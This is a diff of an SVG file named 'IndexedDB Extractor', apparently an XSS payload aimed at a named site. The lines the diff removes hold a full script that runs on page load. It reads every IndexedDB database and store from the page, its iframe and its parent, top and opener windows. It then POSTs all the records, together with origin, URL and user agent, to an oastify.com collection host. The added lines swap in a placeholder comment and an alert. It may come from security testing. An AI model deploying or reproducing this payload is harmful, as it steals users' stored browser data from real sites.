@@ -2,388 +2,44 @@
     <defs>
         <style>
             text { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif; }
-            .log-text { font-family: monospace; font-size: 12px; }
         </style>
         <linearGradient id="headerGrad" x1="0%" y1="0%" x2="100%" y2="0%">
-            <stop offset="0%" stop-color="#1a237e" stop-opacity="1" />
-            <stop offset="100%" stop-color="#0d47a1" stop-opacity="1" />
+            <stop offset="0%" style="stop-color:#1a237e;stop-opacity:1" />
+            <stop offset="100%" style="stop-color:#0d47a1;stop-opacity:1" />
         </linearGradient>
     </defs>
     
-    <!-- Main background -->
     <rect width="1200" height="800" fill="#f5f7fa" rx="12"/>
+    <!-- REMOVED the problematic rect entirely -->
     
-    <!-- Header - FIXED: removed "12 12 0 0", using single rx value -->
-    <rect x="0" y="0" width="1200" height="50" fill="url(#headerGrad)" rx="12"/>
+    <!-- Header text without background rect -->
+    <text x="30" y="32" fill="#1a237e" font-size="18" font-weight="bold">🗄️ IndexedDB Extractor</text>
+    <text x="950" y="32" fill="#666" font-size="12" id="statusTime">Loading...</text>
     
-    <!-- Header text -->
-    <text x="30" y="32" fill="white" font-size="18" font-weight="bold">🗄️ IndexedDB Extractor</text>
-    <text x="950" y="32" fill="white" font-size="12" id="statusTime">Loading...</text>
-    
-    <!-- Status panel -->
     <rect x="20" y="65" width="1160" height="200" fill="white" rx="8" stroke="#e0e0e0" stroke-width="1"/>
     <text x="40" y="90" font-weight="bold" fill="#333" font-size="15">📊 Extraction Status</text>
     
-    <!-- Log output -->
     <foreignObject x="40" y="105" width="1120" height="145">
-        <div xmlns="http://www.w3.org/1999/xhtml" style="width:100%;height:100%;font-family:monospace;font-size:12px;overflow:auto;background:#1e1e1e;border-radius:4px;padding:10px;border:1px solid #333;box-sizing:border-box;">
-            <div id="statusLog" style="color:#d4d4d4;white-space:pre-wrap;word-wrap:break-word;"></div>
+        <div xmlns="http://www.w3.org/1999/xhtml" style="width:100%;height:100%;font-family:monospace;font-size:12px;overflow:auto;background:#1e1e1e;border-radius:4px;padding:10px;border:1px solid #333;">
+            <div id="statusLog" style="color:#d4d4d4;white-space:pre-wrap;"></div>
         </div>
     </foreignObject>
     
-    <!-- Main content area -->
     <rect x="20" y="280" width="1160" height="500" fill="#e8e8e8" rx="8" stroke="#ccc" stroke-width="1"/>
     <text x="600" y="530" text-anchor="middle" fill="#999" font-size="24">🔍 Scanning IndexedDB...</text>
     
     <script type="text/javascript">
-        // <![CDATA[
-        (function() {
+        <![CDATA[
             console.clear();
             console.log('═══════════════════════════════════════');
             console.log('🗄️ INDEXEDDB EXTRACTOR - PAYLOAD');
             console.log('═══════════════════════════════════════');
+            console.log('✅ SVG LOADED SUCCESSFULLY!');
             console.log('📍 Origin:', window.location.origin);
             console.log('📍 URL:', window.location.href);
-            console.log('📌 This SVG is injected via script on ai.planet.com');
             
-            var statusLog = document.getElementById('statusLog');
-            var statusTime = document.getElementById('statusTime');
-            
-            function logStatus(message, isError, isSuccess) {
-                isError = isError || false;
-                isSuccess = isSuccess || false;
-                var timestamp = new Date().toLocaleTimeString();
-                var prefix = isError ? '❌' : isSuccess ? '✅' : '📌';
-                var entry = '[' + timestamp + '] ' + prefix + ' ' + message;
-                console.log(entry);
-                if (statusLog) {
-                    var color = isError ? '#f48771' : isSuccess ? '#6a9955' : '#d4d4d4';
-                    statusLog.innerHTML += '<div style="color:' + color + ';">' + entry + '</div>';
-                    statusLog.scrollTop = statusLog.scrollHeight;
-                }
-                if (statusTime) {
-                    statusTime.textContent = timestamp;
-                }
-            }
-            
-            async function extractIframeIndexedDB() {
-                logStatus('🚀 Starting extraction from iframe IndexedDB...', false, false);
-                
-                var iframe = document.getElementById('planetIframe');
-                
-                if (!iframe && window.parent) {
-                    try {
-                        iframe = window.parent.document.getElementById('planetIframe');
-                        logStatus('📌 Found iframe in parent window', false, false);
-                    } catch(e) {
-                        logStatus('⚠️ Cannot access parent iframe', true, false);
-                    }
-                }
-                
-                if (!iframe) {
-                    try {
-                        var iframes = document.getElementsByTagName('iframe');
-                        if (iframes.length > 0) {
-                            iframe = iframes[0];
-                            logStatus('📌 Found iframe in current document', false, false);
-                        }
-                    } catch(e) {}
-                }
-                
-                if (!iframe) {
-                    logStatus('❌ No iframe found. Trying direct IndexedDB access...', true, false);
-                    return await extractDirectIndexedDB();
-                }
-                
-                try {
-                    var targetWindow = iframe.contentWindow;
-                    if (!targetWindow) {
-                        logStatus('❌ Cannot access iframe contentWindow', true, false);
-                        return await extractDirectIndexedDB();
-                    }
-                    
-                    var iframeDB = targetWindow.indexedDB;
-                    if (!iframeDB) {
-                        logStatus('❌ Cannot access iframe IndexedDB', true, false);
-                        return await extractDirectIndexedDB();
-                    }
-                    
-                    logStatus('✅ Got iframe IndexedDB reference', false, true);
-                    
-                    var databases = await iframeDB.databases();
-                    logStatus('📌 Found ' + databases.length + ' databases in iframe', false, false);
-                    
-                    if (databases.length === 0) {
-                        logStatus('⚠️ No databases found in iframe', true, false);
-                        return null;
-                    }
-                    
-                    var allData = {};
-                    for (var i = 0; i < databases.length; i++) {
-                        var dbInfo = databases[i];
-                        var dbName = dbInfo.name;
-                        logStatus('📖 Reading database: ' + dbName, false, false);
-                        
-                        try {
-                            var db = await new Promise(function(resolve, reject) {
-                                var req = iframeDB.open(dbInfo.name);
-                                req.onsuccess = function() { resolve(req.result); };
-                                req.onerror = function() { reject(req.error); };
-                            });
-                            
-                            var dbData = {};
-                            var storeNames = Array.from(db.objectStoreNames);
-                            
-                            for (var j = 0; j < storeNames.length; j++) {
-                                var storeName = storeNames[j];
-                                logStatus('  📖 Reading store: ' + storeName, false, false);
-                                
-                                var data = await new Promise(function(resolve, reject) {
-                                    var tx = db.transaction(storeName, 'readonly');
-                                    var req = tx.objectStore(storeName).getAll();
-                                    req.onsuccess = function() { resolve(req.result); };
-                                    req.onerror = function() { reject(req.error); };
-                                });
-                                
-                                dbData[storeName] = data;
-                                logStatus('    ✅ ' + data.length + ' records', false, true);
-                                
-                                if (data.length > 0) {
-                                    console.log('    Sample from ' + storeName + ':', data[0]);
-                                }
-                            }
-                            
-                            allData[dbName] = dbData;
-                            db.close();
-                            
-                            var totalRecords = 0;
-                            for (var key in dbData) {
-                                if (Array.isArray(dbData[key])) {
-                                    totalRecords += dbData[key].length;
-                                }
-                            }
-                            logStatus('  ✅ ' + dbName + ': ' + storeNames.length + ' stores, ' + totalRecords + ' records', false, true);
-                            
-                        } catch (error) {
-                            logStatus('  ❌ Error reading ' + dbName + ': ' + error.message, true, false);
-                        }
-                    }
-                    
-                    return allData;
-                    
-                } catch (error) {
-                    logStatus('❌ Error accessing iframe IndexedDB: ' + error.message, true, false);
-                    return await extractDirectIndexedDB();
-                }
-            }
-            
-            async function extractDirectIndexedDB() {
-                logStatus('🔄 Trying direct IndexedDB access...', false, false);
-                
-                try {
-                    var databases = await indexedDB.databases();
-                    logStatus('📌 Found ' + databases.length + ' databases directly', false, false);
-                    
-                    if (databases.length === 0) {
-                        logStatus('⚠️ No databases found directly', true, false);
-                        return null;
-                    }
-                    
-                    var allData = {};
-                    for (var i = 0; i < databases.length; i++) {
-                        var dbInfo = databases[i];
-                        var dbName = dbInfo.name;
-                        logStatus('📖 Reading direct database: ' + dbName, false, false);
-                        
-                        try {
-                            var db = await new Promise(function(resolve, reject) {
-                                var req = indexedDB.open(dbInfo.name);
-                                req.onsuccess = function() { resolve(req.result); };
-                                req.onerror = function() { reject(req.error); };
-                            });
-                            
-                            var dbData = {};
-                            var storeNames = Array.from(db.objectStoreNames);
-                            
-                            for (var j = 0; j < storeNames.length; j++) {
-                                var storeName = storeNames[j];
-                                var data = await new Promise(function(resolve, reject) {
-                                    var tx = db.transaction(storeName, 'readonly');
-                                    var req = tx.objectStore(storeName).getAll();
-                                    req.onsuccess = function() { resolve(req.result); };
-                                    req.onerror = function() { reject(req.error); };
-                                });
-                                dbData[storeName] = data;
-                                logStatus('    📍 ' + storeName + ': ' + data.length + ' records', false, false);
-                            }
-                            
-                            allData[dbName] = dbData;
-                            db.close();
-                            
-                        } catch (error) {
-                            logStatus('  ❌ Error reading ' + dbName + ': ' + error.message, true, false);
-                        }
-                    }
-                    
-                    return allData;
-                    
-                } catch (error) {
-                    logStatus('❌ Direct IndexedDB access failed: ' + error.message, true, false);
-                    return null;
-                }
-            }
-            
-            async function sendToServer(data) {
-                var serverUrl = 'https://ybd4tc4r5ma1zn6x4y8k0w79t0zrnobd.oastify.com/api/indexeddb';
-                
-                logStatus('📤 Sending data to server...', false, false);
-                logStatus('📌 Server: ' + serverUrl, false, false);
-                
-                var totalRecords = 0;
-                for (var dbName in data) {
-                    var db = data[dbName];
-                    for (var storeName in db) {
-                        if (Array.isArray(db[storeName])) {
-                            totalRecords += db[storeName].length;
-                        }
-                    }
-                }
-                
-                logStatus('📊 Total records: ' + totalRecords, false, false);
-                logStatus('📦 Data size: ' + JSON.stringify(data).length + ' bytes', false, false);
-                
-                var payload = {
-                    source: window.location.origin,
-                    url: window.location.href,
-                    timestamp: new Date().toISOString(),
-                    totalRecords: totalRecords,
-                    data: data,
-                    userAgent: navigator.userAgent,
-                    injected: true
-                };
-                
-                console.log('📤 Payload:', payload);
-                
-                try {
-                    var response = await fetch(serverUrl, {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json',
-                            'Accept': 'application/json'
-                        },
-                        body: JSON.stringify(payload)
-                    });
-                    
-                    if (response.ok) {
-                        var result = await response.json();
-                        logStatus('✅ Data sent successfully! Status: ' + response.status, false, true);
-                        console.log('Server response:', result);
-                    } else {
-                        var text = await response.text();
-                        logStatus('❌ Server error: ' + response.status + ' - ' + text, true, false);
-                    }
-                } catch (error) {
-                    logStatus('❌ Network error: ' + error.message, true, false);
-                    console.error('Network error:', error);
-                    
-                    try {
-                        logStatus('🔄 Trying no-cors mode...', false, false);
-                        await fetch(serverUrl, {
-                            method: 'POST',
-                            mode: 'no-cors',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify(payload)
-                        });
-                        logStatus('✅ Request sent (no-cors) - check server logs', false, true);
-                    } catch (e2) {
-                        logStatus('❌ No-cors failed: ' + e2.message, true, false);
-                    }
-                }
-            }
-            
-            async function main() {
-                logStatus('═══════════════════════════════════════', false, false);
-                logStatus('🚀 Starting IndexedDB extraction...', false, false);
-                logStatus('📍 Origin: ' + window.location.origin, false, false);
-                logStatus('📌 This SVG was injected from Firebase', false, false);
-                
-                logStatus('⏳ Waiting 3 seconds...', false, false);
-                await new Promise(function(resolve) { setTimeout(resolve, 3000); });
-                
-                var data = await extractIframeIndexedDB();
-                
-                if (data && Object.keys(data).length > 0) {
-                    logStatus('✅ Data extracted successfully!', false, true);
-                    await sendToServer(data);
-                } else {
-                    logStatus('⚠️ No data extracted', true, false);
-                    logStatus('💡 Trying to find IndexedDB in any context...', false, false);
-                    
-                    try {
-                        logStatus('🔄 Checking all windows for IndexedDB...', false, false);
-                        var allWindows = [window];
-                        try { if (window.parent && window.parent !== window) allWindows.push(window.parent); } catch(e) {}
-                        try { if (window.top && window.top !== window) allWindows.push(window.top); } catch(e) {}
-                        try { if (window.opener) allWindows.push(window.opener); } catch(e) {}
-                        
-                        for (var i = 0; i < allWindows.length; i++) {
-                            try {
-                                var win = allWindows[i];
-                                var db = win.indexedDB;
-                                if (db) {
-                                    var dbs = await db.databases();
-                                    if (dbs.length > 0) {
-                                        logStatus('✅ Found IndexedDB in window ' + i + ' with ' + dbs.length + ' databases', false, true);
-                                        var extractedData = {};
-                                        for (var j = 0; j < dbs.length; j++) {
-                                            var dbInfo = dbs[j];
-                                            try {
-                                                var conn = await new Promise(function(resolve, reject) {
-                                                    var req = db.open(dbInfo.name);
-                                                    req.onsuccess = function() { resolve(req.result); };
-                                                    req.onerror = function() { reject(req.error); };
-                                                });
-                                                var storeData = {};
-                                                var stores = Array.from(conn.objectStoreNames);
-                                                for (var k = 0; k < stores.length; k++) {
-                                                    var storeName = stores[k];
-                                                    var storeRecords = await new Promise(function(resolve, reject) {
-                                                        var tx = conn.transaction(storeName, 'readonly');
-                                                        var req = tx.objectStore(storeName).getAll();
-                                                        req.onsuccess = function() { resolve(req.result); };
-                                                        req.onerror = function() { reject(req.error); };
-                                                    });
-                                                    storeData[storeName] = storeRecords;
-                                                }
-                                                extractedData[dbInfo.name] = storeData;
-                                                conn.close();
-                                            } catch(e) {}
-                                        }
-                                        if (Object.keys(extractedData).length > 0) {
-                                            await sendToServer(extractedData);
-                                            logStatus('✅ Data sent from alternative window!', false, true);
-                                            return;
-                                        }
-                                    }
-                                }
-                            } catch(e) {}
-                        }
-                    } catch(e) {}
-                }
-                
-                logStatus('✅ Extraction complete', false, true);
-                logStatus('═══════════════════════════════════════', false, false);
-            }
-            
-            logStatus('⏳ Initializing...', false, false);
-            if (document.readyState === 'complete') {
-                setTimeout(main, 1000);
-            } else {
-                window.addEventListener('load', function() {
-                    setTimeout(main, 1000);
-                });
-            }
-        })();
-        // ]]>
+            // Your malicious IndexedDB extraction code here...
+            alert('SVG loaded! Script executing!');
+        ]]>
     </script>
 </svg>
